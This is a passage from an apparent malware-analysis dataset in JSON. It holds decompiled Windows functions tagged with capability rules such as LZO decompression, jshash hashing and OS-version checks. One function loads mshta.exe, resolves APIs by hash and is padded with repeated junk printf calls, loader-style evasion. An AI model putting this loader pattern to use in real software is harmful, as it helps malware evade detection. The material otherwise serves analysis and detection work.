        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0041a2eb(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t *arg_8h_00;\n    int32_t unaff_EBP;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.00419d14(0x441a08, 0x14);\n    *(unaff_EBP + -0x20) = 0xffffffff;\n    fcn.0041c713(0xd);\n    *(unaff_EBP + -4) = 0;\n    *0x4507c8 = 0;\n    iVar1 = *(unaff_EBP + 8);\n    if (iVar1 == -2) {\n        *0x4507c8 = 1;\n        iVar1 = (*_sym.imp.KERNEL32.dll_GetOEMCP)();\n    }\n    else if (iVar1 == -3) {\n        *0x4507c8 = 1;\n        iVar1 = (*_sym.imp.KERNEL32.dll_GetACP)();\n    }\n    else if (iVar1 == -4) {\n        *0x4507c8 = 1;\n        iVar1 = *0x450bac;\n    }\n    *(unaff_EBP + 8) = iVar1;\n    arg_8h_00 = *0x451fe8;\n    if (iVar1 == *0x452104) {\n        *(unaff_EBP + -0x20) = 0;\n    }\n    else {\n        *(unaff_EBP + -0x24) = *0x451fe8;\n        if ((arg_8h_00 == NULL) || (*arg_8h_00 != 0)) {\n            arg_8h_00 = fcn.004188ff(0x220);\n            *(unaff_EBP + -0x24) = arg_8h_00;\n        }\n        if (arg_8h_00 != NULL) {\n            iVar1 = fcn.0041a15b(*(unaff_EBP + 8));\n            *(unaff_EBP + -0x20) = iVar1;\n            if (iVar1 == 0) {\n                *arg_8h_00 = 0;\n                arg_8h_00[1] = *0x452104;\n                arg_8h_00[2] = *0x451fec;\n                arg_8h_00[3] = *0x451fe4;\n                for (iVar1 = 0; *(unaff_EBP + -0x1c) = iVar1,  iVar1 < 5; iVar1 = iVar1 + 1) {\n                    *(arg_8h_00 + iVar1 * 2 + 0x10) = *(iVar1 * 2 + 0x452110);\n                }\n                for (iVar1 = 0; *(unaff_EBP + -0x1c) = iVar1,  iVar1 < 0x101; iVar1 = iVar1 + 1) {\n                    *(iVar1 + 0x1c + arg_8h_00) = *(iVar1 + 0x452000);\n                }\n                for (iVar1 = 0; *(unaff_EBP + -0x1c) = iVar1,  *0x451fe8 = arg_8h_00,  iVar1 < 0x100; iVar1 = iVar1 + 1)\n                {\n                    *(iVar1 + 0x11d + arg_8h_00) = *(iVar1 + 0x452120);\n                }\n            }\n        }\n        if ((*(unaff_EBP + -0x20) == -1) && (arg_8h_00 != *0x451fe8)) {\n            fcn.00418911(arg_8h_00);\n        }\n    }\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.0041a432();\n    fcn.00419d4f();\n    return;\n}\n",
        "token_count": 908
    },
    "00420cce": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00420cce(uint arg_8h, uint arg_ch)\n\n{\n    int32_t *arg_8h_00;\n    int32_t iVar1;\n    int32_t unaff_EBP;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.00419d14(0x4424c0, 0x14);\n    if ((-1 < *(unaff_EBP + 8)) && (*(unaff_EBP + 8) < 6)) {\n        fcn.0041c713(0xc);\n        *(unaff_EBP + -4) = 0;\n        if (*(unaff_EBP + 0xc) == 0) {\n            fcn.00420af5();\n            fcn.004181ba(unaff_EBP + -0x10, 0xffffffff);\n        }\n        else {\n            arg_8h_00 = fcn.004188ff(0x54);\n            *(unaff_EBP + -0x24) = arg_8h_00;\n            if (arg_8h_00 == NULL) {\n                *(unaff_EBP + -0x1c) = 0;\n            }\n            else {\n                iVar1 = fcn.00420af5();\n                *(unaff_EBP + -0x1c) = iVar1;\n                if (iVar1 != 0) {\n                    *arg_8h_00 = 0;\n                    arg_8h_00[1] = *0x450bac;\n                    arg_8h_00[2] = *0x450bb0;\n                    for (iVar1 = 0; *(unaff_EBP + -0x20) = iVar1,  iVar1 < 6; iVar1 = iVar1 + 1) {\n                        arg_8h_00[iVar1 + 3] = *(iVar1 * 4 + 0x450b94);\n                    }\n                    arg_8h_00[9] = *0x44dcb0;\n                    arg_8h_00[10] = *0x44dd40;\n                    arg_8h_00[0xb] = *0x450e78;\n                    arg_8h_00[0xc] = *0x450e7c;\n                    arg_8h_00[0xd] = *0x450e74;\n                    arg_8h_00[0xe] = *0x44df9c;\n                    arg_8h_00[0xf] = *0x450bdc;\n                    arg_8h_00[0x10] = *0x450e70;\n                    arg_8h_00[0x11] = *0x450e6c;\n                    arg_8h_00[0x12] = *0x44dcc0;\n                    arg_8h_00[0x13] = *0x44dea8;\n                    arg_8h_00[0x14] = *0x450bd8;\n                    if ((**0x44db2c == 0) && (*0x44db2c != 0x44dad8)) {\n                        fcn.00420331(*0x44db2c);\n                    }\n                    *0x44db2c = arg_8h_00;\n                    fcn.00420401();\n                }\n            }\n            if ((*(unaff_EBP + -0x1c) == 0) && (arg_8h_00 != NULL)) {\n                fcn.00418911(arg_8h_00);\n            }\n            *(unaff_EBP + -4) = 0xffffffff;\n            fcn.00420e17();\n        }\n    }\n    fcn.00419d4f();\n    return;\n}\n",
        "token_count": 861
    },
    "00401d40": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nulong fcn.00401d40(int32_t **param_1)\n\n{\n    code *pcVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    int32_t **ppiVar6;\n    int32_t **ppiVar7;\n    ulong uVar8;\n    \n    piVar2 = (**(**param_1 + 0x10))();\n    ppiVar6 = param_1 + 3;\n    if ((-1 < param_1[3]) && (piVar2 == *param_1)) {\n        LOCK();\n        piVar2 = *ppiVar6;\n        *ppiVar6 = *ppiVar6 + 1;\n        return CONCAT44(piVar2, param_1);\n    }\n    iVar3 = (***piVar2)(param_1[1], 1);\n    if (iVar3 == 0) {\n        fcn.00401430(0x8007000e);\n        pcVar1 = swi(3);\n        uVar8 = (*pcVar1)();\n        return uVar8;\n    }\n    *(iVar3 + 4) = param_1[1];\n    uVar4 = param_1[1] + 1;\n    ppiVar6 = param_1 + 4;\n    ppiVar7 = iVar3 + 0x10;\n    for (uVar5 = uVar4 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {\n        *ppiVar7 = *ppiVar6;\n        ppiVar6 = ppiVar6 + 1;\n        ppiVar7 = ppiVar7 + 1;\n    }\n    for (uVar5 = uVar4 & 3; uVar5 != 0; uVar5 = uVar5 - 1) {\n        *ppiVar7 = *ppiVar6;\n        ppiVar6 = ppiVar6 + 1;\n        ppiVar7 = ppiVar7 + 1;\n    }\n    return CONCAT44(uVar4, iVar3);\n}\n",
        "token_count": 466
    },
    "00401e00": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00401e00(int32_t param_1, char param_2, uint32_t param_3)\n\n{\n    uint *puVar1;\n    uint32_t uVar2;\n    uint *puVar3;\n    uint *puVar4;\n    \n    if ((param_2 != '\\0') && (0xf < *(param_1 + 0x18))) {\n        puVar1 = *(param_1 + 4);\n        if (param_3 != 0) {\n            puVar3 = puVar1;\n            puVar4 = param_1 + 4;\n            for (uVar2 = param_3 >> 2; uVar2 != 0; uVar2 = uVar2 - 1) {\n                *puVar4 = *puVar3;\n                puVar3 = puVar3 + 1;\n                puVar4 = puVar4 + 1;\n            }\n            for (uVar2 = param_3 & 3; uVar2 != 0; uVar2 = uVar2 - 1) {\n                *puVar4 = *puVar3;\n                puVar3 = puVar3 + 1;\n                puVar4 = puVar4 + 1;\n            }\n        }\n        fcn.0042f834(puVar1);\n    }\n    *(param_1 + 0x14) = param_3;\n    *(param_1 + 0x18) = 0xf;\n    *(param_1 + 4 + param_3) = 0;\n    return;\n}\n",
        "token_count": 343
    },
    "00401f70": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.00401f70(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint arg_8h)\n\n{\n    uint32_t uVar1;\n    uint *puVar2;\n    int32_t in_ECX;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint *puVar5;\n    uint *puVar6;\n    uint *in_FS_OFFSET;\n    uint32_t var_8h;\n    uint32_t var_ch;\n    uint var_10h;\n    uint var_14h;\n    uint var_ch_2;\n    uint uStack12;\n    uint var_4h;\n    \n    uStack12 = 0x43b2e0;\n    var_ch_2 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch_2;\n    uVar4 = var_8h | 0xf;\n    if (uVar4 != 0xffffffff) {\n        uVar1 = *(in_ECX + 0x18);\n        uVar3 = uVar1 >> 1;\n        var_8h = uVar4;\n        if ((uVar4 / 3 < uVar3) && (uVar1 <= -uVar3 - 2)) {\n            var_8h = uVar3 + uVar1;\n        }\n    }\n    var_4h = 0;\n    puVar2 = fcn.0042f804(var_8h + 1);\n    if (var_ch != 0) {\n        if (*(in_ECX + 0x18) < 0x10) {\n            puVar5 = in_ECX + 4;\n        }\n        else {\n            puVar5 = *(in_ECX + 4);\n        }\n        puVar6 = puVar2;\n        for (uVar4 = var_ch >> 2; uVar4 != 0; uVar4 = uVar4 - 1) {\n            *puVar6 = *puVar5;\n            puVar5 = puVar5 + 1;\n            puVar6 = puVar6 + 1;\n        }\n        for (uVar4 = var_ch & 3; uVar4 != 0; uVar4 = uVar4 - 1) {\n            *puVar6 = *puVar5;\n            puVar5 = puVar5 + 1;\n            puVar6 = puVar6 + 1;\n        }\n    }\n    if (0xf < *(in_ECX + 0x18)) {\n        fcn.0042f834(*(in_ECX + 4));\n    }\n    puVar5 = in_ECX + 4;\n    *puVar5 = 0;\n    *puVar5 = puVar2;\n    *(in_ECX + 0x18) = var_8h;\n    *(in_ECX + 0x14) = var_ch;\n    if (0xf < var_8h) {\n        puVar5 = puVar2;\n    }\n    *(puVar5 + var_ch) = 0;\n    *in_FS_OFFSET = var_ch_2;\n    return;\n}\n",
        "token_count": 720
    },
    "004024b0": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nbool __thiscall fcn.004024b0(int32_t param_1, uint32_t param_2, uint param_3, uint param_4, uint param_5, uint param_6)\n\n{\n    uint *puVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint unaff_EBP;\n    uint unaff_ESI;\n    uint *puVar4;\n    uint *puVar5;\n    uint unaff_retaddr;\n    char cVar6;\n    \n    if (param_2 == 0xffffffff) {\n        fcn.004272b2();\n    }\n    uVar2 = *(param_1 + 0x18);\n    if (param_2 <= uVar2) {\n        if ((cVar6 != '\\0') && (param_2 < 0x10)) {\n            uVar3 = *(param_1 + 0x14);\n            if (param_2 < *(param_1 + 0x14)) {\n                uVar3 = param_2;\n            }\n            if (0xf < uVar2) {\n                puVar1 = *(param_1 + 4);\n                if (uVar3 != 0) {\n                    puVar4 = puVar1;\n                    puVar5 = param_1 + 4;\n                    for (uVar2 = uVar3 >> 2; uVar2 != 0; uVar2 = uVar2 - 1) {\n                        *puVar5 = *puVar4;\n                        puVar4 = puVar4 + 1;\n                        puVar5 = puVar5 + 1;\n                    }\n                    for (uVar2 = uVar3 & 3; uVar2 != 0; uVar2 = uVar2 - 1) {\n                        *puVar5 = *puVar4;\n                        puVar4 = puVar4 + 1;\n                        puVar5 = puVar5 + 1;\n                    }\n                }\n                fcn.0042f834(puVar1);\n            }\n            *(param_1 + 0x14) = uVar3;\n            *(param_1 + 0x18) = 0xf;\n            *(uVar3 + 4 + param_1) = 0;\n            return param_2 != 0;\n        }\n        if (param_2 == 0) {\n            *(param_1 + 0x14) = 0;\n            if (0xf < uVar2) {\n                **(param_1 + 4) = 0;\n                return false;\n            }\n            *(param_1 + 4) = 0;\n        }\n        return param_2 != 0;\n    }\n    fcn.00401f70(param_2, *(param_1 + 0x14), unaff_ESI, unaff_EBP, unaff_retaddr, param_2, param_3, param_4, param_5, \n                 param_6);\n    return param_2 != 0;\n}\n",
        "token_count": 653
    },
    "00402860": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00402860(int32_t *param_1, uint *param_2, uint32_t param_3)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint *extraout_EDX;\n    uint32_t unaff_ESI;\n    uint32_t uVar3;\n    uint32_t unaff_EDI;\n    uint *arg_8h;\n    uint *unaff_retaddr;\n    uint32_t in_stack_ffffffec;\n    \n    if (param_3 == 0) {\n        fcn.00401c80();\n        return;\n    }\n    if (param_2 != NULL) goto code_r0x00402888;\n    do {\n        fcn.00401430();\n        param_2 = extraout_EDX;\ncode_r0x00402888:\n        iVar1 = *param_1;\n        uVar3 = param_2 - iVar1;\n        uVar2 = *(iVar1 + -0xc);\n        if ((1U - *(iVar1 + -4) | *(iVar1 + -8) - param_3) < 0) {\n            param_2 = unaff_retaddr;\n            in_stack_ffffffec = param_3;\n            fcn.00401cf0(param_3, unaff_EDI, unaff_ESI);\n            unaff_retaddr = param_2;\n        }\n        unaff_ESI = unaff_EDI;\n        unaff_EDI = in_stack_ffffffec;\n        arg_8h = *param_1;\n        if (uVar2 < uVar3) {\n            for (uVar2 = param_3 >> 2; uVar2 != 0; uVar2 = uVar2 - 1) {\n                *arg_8h = *param_2;\n                param_2 = param_2 + 1;\n                arg_8h = arg_8h + 1;\n            }\n            for (uVar2 = param_3 & 3; uVar2 != 0; uVar2 = uVar2 - 1) {\n                *arg_8h = *param_2;\n                param_2 = param_2 + 1;\n                arg_8h = arg_8h + 1;\n            }\n        }\n        else {\n            fcn.00418360(arg_8h, arg_8h + uVar3, param_3);\n        }\n        in_stack_ffffffec = unaff_EDI;\n    } while ((param_3 < 0) || (*(*param_1 + -8) < param_3));\n    *(*param_1 + -0xc) = param_3;\n    *(param_3 + *param_1) = 0;\n    return;\n}\n",
        "token_count": 597
    },
    "00402ac0": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nint32_t __thiscall fcn.00402ac0(int32_t param_1, int32_t param_2, uint32_t param_3, uint32_t param_4)\n\n{\n    int32_t *piVar1;\n    uint32_t uVar2;\n    uint unaff_EBX;\n    uint unaff_EBP;\n    uint32_t noname_0;\n    uint unaff_ESI;\n    uint *puVar3;\n    uint unaff_EDI;\n    int32_t *piVar4;\n    uint unaff_retaddr;\n    \n    if (*(param_2 + 0x14) < param_3) {\n        fcn.00427217();\n    }\n    noname_0 = *(param_2 + 0x14) - param_3;\n    if (param_4 < noname_0) {\n        noname_0 = param_4;\n    }\n    if (param_1 != param_2) {\n        if (noname_0 == 0xffffffff) {\n            fcn.004272b2();\n        }\n        if (*(param_1 + 0x18) < noname_0) {\n            fcn.00401f70(noname_0, *(param_1 + 0x14), unaff_EDI, unaff_ESI, unaff_EBP, unaff_EBX, unaff_retaddr, param_2\n                         , param_3, param_4);\n        }\n        else if (noname_0 == 0) {\n            *(param_1 + 0x14) = 0;\n            if (*(param_1 + 0x18) < 0x10) {\n                *(param_1 + 4) = 0;\n                return param_1;\n            }\n            **(param_1 + 4) = 0;\n            return param_1;\n        }\n        if (noname_0 != 0) {\n            if (*(param_2 + 0x18) < 0x10) {\n                param_2 = param_2 + 4;\n            }\n            else {\n                param_2 = *(param_2 + 4);\n            }\n            piVar1 = param_1 + 4;\n            piVar4 = piVar1;\n            if (0xf < *(param_1 + 0x18)) {\n                piVar4 = *piVar1;\n            }\n            puVar3 = param_3 + param_2;\n            for (uVar2 = noname_0 >> 2; uVar2 != 0; uVar2 = uVar2 - 1) {\n                *piVar4 = *puVar3;\n                puVar3 = puVar3 + 1;\n                piVar4 = piVar4 + 1;\n            }\n            for (uVar2 = noname_0 & 3; uVar2 != 0; uVar2 = uVar2 - 1) {\n                *piVar4 = *puVar3;\n                puVar3 = puVar3 + 1;\n                piVar4 = piVar4 + 1;\n            }\n            *(param_1 + 0x14) = noname_0;\n            if (0xf < *(param_1 + 0x18)) {\n                piVar1 = *piVar1;\n            }\n            *(piVar1 + noname_0) = 0;\n        }\n        return param_1;\n    }\n    fcn.00401ef0(noname_0 + param_3, 0xffffffff);\n    fcn.00401ef0(0, param_3);\n    return param_1;\n}\n",
        "token_count": 786
    },
    "00402bb0": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nint32_t __thiscall fcn.00402bb0(int32_t param_1, uint *param_2, uint32_t param_3, uint param_4)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint32_t uVar4;\n    uint unaff_EBX;\n    uint unaff_EBP;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    uint unaff_retaddr;\n    \n    uVar4 = *(param_1 + 0x18);\n    if (uVar4 < 0x10) {\n        puVar1 = param_1 + 4;\n    }\n    else {\n        puVar1 = *(param_1 + 4);\n    }\n    if (puVar1 <= param_2) {\n        puVar1 = param_1 + 4;\n        puVar3 = puVar1;\n        if (0xf < uVar4) {\n            puVar3 = *puVar1;\n        }\n        if (param_2 < *(param_1 + 0x14) + puVar3) {\n            if (0xf < uVar4) {\n                puVar1 = *puVar1;\n            }\n            iVar2 = fcn.00402ac0(param_1, param_2 - puVar1, param_3);\n            return iVar2;\n        }\n    }\n    if (param_3 == 0xffffffff) {\n        fcn.004272b2();\n    }\n    if (*(param_1 + 0x18) < param_3) {\n        fcn.00401f70(param_3, *(param_1 + 0x14), unaff_EBP, unaff_EDI, unaff_ESI, unaff_EBX, unaff_retaddr, param_2, \n                     param_3, param_4);\n    }\n    else if (param_3 == 0) {\n        *(param_1 + 0x14) = 0;\n        if (*(param_1 + 0x18) < 0x10) {\n            *(param_1 + 4) = 0;\n            return param_1;\n        }\n        **(param_1 + 4) = 0;\n        return param_1;\n    }\n    if (param_3 != 0) {\n        if (*(param_1 + 0x18) < 0x10) {\n            puVar1 = param_1 + 4;\n        }\n        else {\n            puVar1 = *(param_1 + 4);\n        }\n        for (uVar4 = param_3 >> 2; uVar4 != 0; uVar4 = uVar4 - 1) {\n            *puVar1 = *param_2;\n            param_2 = param_2 + 1;\n            puVar1 = puVar1 + 1;\n        }\n        for (uVar4 = param_3 & 3; uVar4 != 0; uVar4 = uVar4 - 1) {\n            *puVar1 = *param_2;\n            param_2 = param_2 + 1;\n            puVar1 = puVar1 + 1;\n        }\n        *(param_1 + 0x14) = param_3;\n        if (0xf < *(param_1 + 0x18)) {\n            *(*(param_1 + 4) + param_3) = 0;\n            return param_1;\n        }\n        *(param_1 + 4 + param_3) = 0;\n    }\n    return param_1;\n}\n",
        "token_count": 784
    },
    "00407290": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nuint fcn.00407290(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    code *pcVar3;\n    code *pcVar4;\n    code *pcVar5;\n    code *pcVar6;\n    int32_t iVar7;\n    uint32_t uVar8;\n    uint *puVar9;\n    uint32_t uVar10;\n    uint32_t unaff_EBX;\n    int32_t unaff_EDI;\n    uint *puVar11;\n    int32_t *in_FS_OFFSET;\n    char16_t *pcVar12;\n    uint uVar13;\n    uint *puVar14;\n    uint *puVar15;\n    uint uVar16;\n    int32_t iStack44;\n    int32_t iStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack4 = 0xffffffff;\n    uStack8 = 0x43b488;\n    iStack12 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &iStack12;\n    fcn.00402bb0(\"uFBcWb2Wj6h3wWwBjgoASXLKWoLwGqaiXuPx7CdAvAbHqgC9NQrUzjiIlgcwykSG\");\n    pcVar3 = _sym.imp.KERNEL32.dll_LoadLibraryExW;\n    uVar16 = 0;\n    puVar14 = NULL;\n    iStack12 = 0;\n    uVar1 = (*_sym.imp.KERNEL32.dll_LoadLibraryExW)(0x43dd24, 0, 0);\n    uVar13 = 0;\n    pcVar12 = L\"mshta.exe\";\n    iVar2 = (*pcVar3)(L\"mshta.exe\", 0, 0);\n    if (iVar2 == 0) {\n        if (0xf < unaff_EBX) {\n            fcn.0042f834(uVar16);\n        }\n        *in_FS_OFFSET = iStack44;\n        return 0;\n    }\n    pcVar3 = fcn.00401510(uVar1, 0x16de565f);\n    pcVar4 = fcn.00401510(uVar1, 0x1a4b89aa);\n    pcVar5 = fcn.00401510(uVar1, 0xfa0d8e3c);\n    fcn.00401510(uVar1, 0x31cb1743);\n    pcVar6 = fcn.00401510(uVar1, 0xdd678bd0);\n    iVar2 = (*pcVar5)(0, 0x7102, 10);\n    if (iVar2 == 0) {\n        fcn.0042f834(uVar13);\n        *in_FS_OFFSET = unaff_EDI;\n        return 0;\n    }\n    iVar7 = (*pcVar12)(0, iVar2);\n    if (iVar7 == 0) {\n        fcn.0042f834(uVar13);\n        *in_FS_OFFSET = unaff_EDI;\n        return 0;\n    }\n    uVar8 = (*pcVar6)(0, iVar2);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    